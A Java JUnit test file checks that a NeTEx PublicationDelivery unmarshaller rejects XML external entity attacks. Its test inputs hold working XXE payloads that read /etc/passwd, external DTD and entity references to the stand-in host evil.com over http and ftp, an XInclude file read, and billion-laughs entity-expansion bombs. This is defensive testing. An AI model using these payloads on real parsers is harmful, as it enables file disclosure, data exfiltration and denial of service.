package org.rutebanken.sobek.netex.marshal;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.xml.sax.SAXParseException;
import org.xml.sax.SAXException;
import jakarta.xml.bind.JAXBException;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import static org.junit.jupiter.api.Assertions.*;

class PublicationDeliveryUnmarshallerXXETest {

    private final PublicationDeliveryUnmarshaller unmarshaller = new PublicationDeliveryUnmarshaller();

    @Test
    @DisplayName("Should reject XML with external general entity reference")
    void testRejectsExternalGeneralEntity() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>&xxe;</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should reject XML with external parameter entity")
    void testRejectsExternalParameterEntity() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY % xxe SYSTEM "file:///etc/passwd">
              %xxe;
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>2026-04-27T10:44:42.135</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should reject XML with DOCTYPE declaration")
    void testRejectsDoctypeDeclaration() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE PublicationDelivery [
              <!ELEMENT PublicationDelivery ANY>
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>2026-04-27T10:44:42.135</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        JAXBException exception = assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
        assertTrue(exception.getLinkedException().getMessage().toLowerCase().contains("doctype") ||
                exception.getCause() instanceof SAXParseException,
            "Exception should be related to DOCTYPE declaration");
    }

    @Test
    @DisplayName("Should reject XML with external DTD reference")
    void testRejectsExternalDTDReference() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE PublicationDelivery SYSTEM "http://evil.com/evil.dtd">
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>2026-04-27T10:44:42.135</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should reject XML with XInclude")
    void testRejectsXInclude() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex" 
                                 xmlns:xi="http://www.w3.org/2001/XInclude">
                <xi:include href="file:///etc/passwd" parse="text"/>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        // Should either throw exception or ignore XInclude directive (both are safe)
        assertDoesNotThrow(() -> {
            try {
                var result = unmarshaller.unmarshal(inputStream);
                // If it doesn't throw, verify XInclude was not processed
                assertNotNull(result);
            } catch (SAXException | JAXBException e) {
                // This is also acceptable - XInclude was rejected
                assertTrue(true);
            }
        });
    }

    @Test
    @DisplayName("Should reject XML with billion laughs attack (XML bomb)")
    void testRejectsBillionLaughsAttack() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
              <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>&lol4;</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should reject XML with remote URL entity")
    void testRejectsRemoteUrlEntity() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "http://evil.com/evil.xml">
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>&xxe;</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should reject XML with FTP protocol entity")
    void testRejectsFtpProtocolEntity() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "ftp://evil.com/evil.xml">
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>&xxe;</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should successfully parse valid XML without external entities")
    void testSuccessfullyParsesValidXml() throws Exception {
        String validXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>2026-04-27T10:44:42.135</PublicationTimestamp>
                <ParticipantRef>EnTur:Test</ParticipantRef>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(validXml.getBytes(StandardCharsets.UTF_8));

        assertDoesNotThrow(() -> {
            var result = unmarshaller.unmarshal(inputStream);
            assertNotNull(result);
        });
    }

    @Test
    @DisplayName("Should reject XML with nested entity expansion")
    void testRejectsNestedEntityExpansion() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY a "a">
              <!ENTITY b "&a;&a;">
              <!ENTITY c "&b;&b;&b;">
            ]>
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>&c;</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }

    @Test
    @DisplayName("Should reject XML with PUBLIC identifier in DOCTYPE")
    void testRejectsPublicIdentifierInDoctype() {
        String maliciousXml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE PublicationDelivery PUBLIC "-//TEST//DTD Test//EN" "http://evil.com/test.dtd">
            <PublicationDelivery xmlns="http://www.netex.org.uk/netex">
                <PublicationTimestamp>2026-04-27T10:44:42.135</PublicationTimestamp>
            </PublicationDelivery>
            """;

        InputStream inputStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        assertThrows(JAXBException.class, () -> unmarshaller.unmarshal(inputStream));
    }
}